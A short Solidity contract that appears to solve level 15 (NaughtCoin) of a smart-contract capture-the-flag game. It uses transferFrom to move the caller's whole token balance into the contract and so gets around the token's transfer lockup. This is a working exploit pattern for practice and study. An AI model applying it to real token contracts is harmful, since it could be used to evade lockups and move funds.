pragma solidity ^0.6.0;

interface ERC20 {
    function transferFrom(address sender, address receiver, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}
contract Level15 {
    function getCoins(address instance) public {
	ERC20 naughtCoin = ERC20(instance);
	uint256 bal = naughtCoin.balanceOf(msg.sender);
	naughtCoin.transferFrom(msg.sender, address(this), bal);

    }
}
